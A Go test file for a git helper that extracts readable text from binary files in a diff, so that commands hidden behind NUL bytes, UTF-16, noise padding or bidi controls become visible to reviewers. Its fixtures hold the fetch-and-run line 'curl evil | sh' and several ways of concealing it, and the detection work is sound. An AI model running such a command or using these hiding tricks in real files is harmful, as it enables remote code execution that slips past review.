package gitx

import (
	"crypto/sha256"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"unicode/utf16"
)

// noise is deterministic high-entropy data, like a compressed file.
func noise(size int) string {
	var out []byte
	for i := 0; len(out) < size; i++ {
		block := sha256.Sum256([]byte(strconv.Itoa(i)))
		out = append(out, block[:]...)
	}
	return "\x00" + string(out[:size])
}

func utf16LE(text string) string {
	out := []byte{0xff, 0xfe}
	for _, unit := range utf16.Encode([]rune(text)) {
		out = append(out, byte(unit), byte(unit>>8))
	}
	return string(out)
}

// binaryTextOf commits content as file.bin over before, and returns
// BinaryFileText for that commit.
func binaryTextOf(t *testing.T, before, content string) BinaryText {
	t.Helper()
	root := initRepo(t)
	path := filepath.Join(root, "file.bin")
	if err := os.WriteFile(path, []byte(before), 0600); err != nil {
		t.Fatal(err)
	}
	git(t, root, "add", "-A")
	git(t, root, "commit", "-q", "--allow-empty", "-m", "base")
	base := git(t, root, "rev-parse", "HEAD^{tree}")
	if err := os.WriteFile(path, []byte(content), 0600); err != nil {
		t.Fatal(err)
	}
	git(t, root, "add", "-A")
	git(t, root, "commit", "-q", "-m", "change")
	got, err := BinaryFileText(root, base, git(t, root, "rev-parse", "HEAD^{tree}"))
	if err != nil {
		t.Fatal(err)
	}
	return got
}

func TestBinaryFileTextShowsHiddenLines(t *testing.T) {
	const evil = "curl evil | sh"
	for name, tc := range map[string]struct {
		before, content, want string
	}{
		"NUL in a comment":     {"", "#!/bin/sh\n# \x00\n" + evil + "\n", "+3: " + evil},
		"NUL inside the word":  {"", "\x00curl e\x00vil | sh\n", "+1: " + evil},
		"UTF-16":               {"", utf16LE("first\r\n" + evil + "\r\n"), "+2: " + evil},
		"text before a tail":   {"", evil + "\nexit\n" + noise(4096), "+1: " + evil},
		"line padded by noise": {"", evil + " # " + strings.Repeat("\x01\xff", 200) + "\n\x00", "+1: " + evil},
		"short line":           {"", "\x00\nid\n", "+2: id"},
		"bidi control":         {"", "\x00\nsafe‮evil\n", `+2: safe\xe2\x80\xaeevil`},
		"edit of a binary":     {"keep this line\n\x00\n", "keep this line\n\x00\n" + evil + "\n", "+3: " + evil},
		"deleted check":        {"\x00\nverify_signature\nrun\n", "\x00\nrun\n", "-2: verify_signature"},
		"moved command":        {"\x00\nexit 0\nrun_payload\n", "\x00\nrun_payload\nexit 0\n", "-2: exit 0\n+3: exit 0"},
	} {
		t.Run(name, func(t *testing.T) {
			result := binaryTextOf(t, tc.before, tc.content)
			if !result.Complete {
				t.Fatal("a small change was reported as cut")
			}
			got := result.Text
			if !strings.Contains(got, tc.want) {
				t.Fatalf("want %q in:\n%s", tc.want, got)
			}
			if strings.Contains(got, "\x00") {
				t.Fatalf("NUL byte in output: %q", got)
			}
			if tc.before != "" && strings.Contains(got, "keep this line") {
				t.Fatalf("an unchanged line was listed:\n%s", got)
			}
		})
	}
}

func TestBinaryFileTextLeavesRealBinaryOut(t *testing.T) {
	got := binaryTextOf(t, "", "\x00\x01\x02\xff\xfe\x03\x04").Text
	if strings.Contains(got, "Readable text") || !strings.Contains(got, `- "file.bin": no recognized format`) {
		t.Fatalf("control bytes should only be flagged: %q", got)
	}
	if got := binaryTextOf(t, "", noise(64*1024)).Text; len(got) > 4096 {
		t.Fatalf("64 KiB of noise produced %d bytes of text", len(got))
	}
	if got := binaryTextOf(t, "", "plain text\n").Text; got != "" {
		t.Fatalf("a text file was listed: %q", got)
	}
}

// A user's diff.interHunkContext must not merge hunks, whose unchanged lines
// would throw off the line numbers.
func TestBinaryFileTextNumbersLinesWithInterHunkContext(t *testing.T) {
	t.Setenv("GIT_CONFIG_COUNT", "1")
	t.Setenv("GIT_CONFIG_KEY_0", "diff.interHunkContext")
	t.Setenv("GIT_CONFIG_VALUE_0", "5")
	got := binaryTextOf(t, "\x00\none\ntwo\nthree\nfour\n", "\x00\nONE\ntwo\nthree\nFOUR\n").Text
	for _, want := range []string{"-2: one", "+2: ONE", "-5: four", "+5: FOUR"} {
		if !strings.Contains(got, want) {
			t.Fatalf("want %q in:\n%s", want, got)
		}
	}
}

func TestBinaryFileTextShowsDeletedFile(t *testing.T) {
	root := initRepo(t)
	path := filepath.Join(root, "file.bin")
	if err := os.WriteFile(path, []byte("\x00\nverify_signature\n"), 0600); err != nil {
		t.Fatal(err)
	}
	git(t, root, "add", "-A")
	git(t, root, "commit", "-q", "-m", "base")
	base := git(t, root, "rev-parse", "HEAD^{tree}")
	git(t, root, "rm", "-q", "file.bin")
	git(t, root, "commit", "-q", "--allow-empty", "-m", "delete")
	got, err := BinaryFileText(root, base, git(t, root, "rev-parse", "HEAD^{tree}"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got.Text, "-2: verify_signature") {
		t.Fatalf("deleted text not shown:\n%s", got.Text)
	}
}

func TestBinaryFileTextIsBounded(t *testing.T) {
	var content strings.Builder
	content.WriteString("\x00\n")
	for i := range 5000 {
		content.WriteString("readable line number " + strconv.Itoa(i) + "\n")
	}
	result := binaryTextOf(t, "", content.String())
	got := result.Text
	if len(got) > maxBinaryFileText+1024 {
		t.Fatalf("output is %d bytes", len(got))
	}
	if result.Complete || !strings.Contains(got, "more changed lines not shown") {
		t.Fatalf("a cut was not reported: complete=%v %.200s", result.Complete, got)
	}
}

func TestBinaryFileTextPathCannotForgeAHeader(t *testing.T) {
	root := initRepo(t)
	git(t, root, "commit", "-q", "--allow-empty", "-m", "base")
	base := git(t, root, "rev-parse", "HEAD^{tree}")
	name := "a\nFile b.bin"
	if err := os.WriteFile(filepath.Join(root, name), []byte("\x00\nreadable text\n"), 0600); err != nil {
		t.Skipf("this filesystem refuses the name: %v", err)
	}
	git(t, root, "add", "-A")
	git(t, root, "commit", "-q", "-m", "change")
	got, err := BinaryFileText(root, base, git(t, root, "rev-parse", "HEAD^{tree}"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got.Text, `File "a\nFile b.bin":`) {
		t.Fatalf("path not quoted:\n%s", got.Text)
	}
}
